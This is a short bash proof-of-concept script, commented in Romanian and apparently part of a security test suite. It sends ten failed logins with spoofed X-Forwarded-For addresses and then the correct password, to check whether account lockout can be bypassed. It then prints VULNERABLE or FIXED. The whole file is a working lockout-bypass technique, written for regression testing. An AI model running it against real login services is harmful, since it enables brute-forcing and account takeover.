#!/usr/bin/env bash
# poc/4.3_bypass_rate_limit_but_lockout.sh
# testeaza daca IP rotation bypass-uieste lockout

set +e
source "$(dirname "$0")/config.sh"

EMAIL="${1:-}"
CORRECT_PASS="${2:-}"

if [ -z "$EMAIL" ] || [ -z "$CORRECT_PASS" ]; then
    echo "Usage: $0 <email> <correct_password>"
    exit 2
fi

LOGIN_URL="$BASE_URL/login"
OUT_FILE="$OUT_DIR/43_ip_rotation_$(date +%s).txt"
mkdir -p "$OUT_DIR"
: > "$OUT_FILE"

echo "[4.3] IP Rotation bypass attempt" | tee -a "$OUT_FILE"
echo "Email: $EMAIL" | tee -a "$OUT_FILE"
echo "Strategy: 10 failed attempts with DIFFERENT IPs + 1 correct password" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

# reset cont
"$(dirname "$0")/4.3_unlock_acc.sh" "$EMAIL" "$DB_PATH" 2>/dev/null

# Step 1: 10 failed attempts cu IP-uri diferite
echo "[STEP 1] 10 failed attempts (DIFFERENT IPs)" | tee -a "$OUT_FILE"

for i in $(seq 1 10); do
    FAKE_IP="$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"
    
    CODE="$(curl -s -o /dev/null -w "%{http_code}" -X POST "$LOGIN_URL" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $FAKE_IP" \
        -d '{"email":"'"$EMAIL"'","password":"wrong'$i'"}')"
    
    echo "  Try $i (IP=$FAKE_IP) -> HTTP $CODE" | tee -a "$OUT_FILE"
    sleep 0.5
done

echo | tee -a "$OUT_FILE"

# Step 2: Correct password cu ALT IP
echo "[STEP 2] Try CORRECT password (DIFFERENT IP)" | tee -a "$OUT_FILE"

FINAL_IP="$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"

CODE_CORRECT="$(curl -s -o /dev/null -w "%{http_code}" -X POST "$LOGIN_URL" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $FINAL_IP" \
    -d '{"email":"'"$EMAIL"'","password":"'"$CORRECT_PASS"'"}')"

echo "  Correct password (IP=$FINAL_IP) -> HTTP $CODE_CORRECT" | tee -a "$OUT_FILE"

echo | tee -a "$OUT_FILE"
echo "=== VERDICT ===" | tee -a "$OUT_FILE"

if [ "$CODE_CORRECT" = "200" ]; then
    echo "VULNERABLE: IP rotation bypass-uieste lockout" | tee -a "$OUT_FILE"
    exit 1
elif [ "$CODE_CORRECT" = "401" ]; then
    echo "FIXED: IP rotation nu bypass-uieste (lockout per cont)" | tee -a "$OUT_FILE"
    exit 0
fi

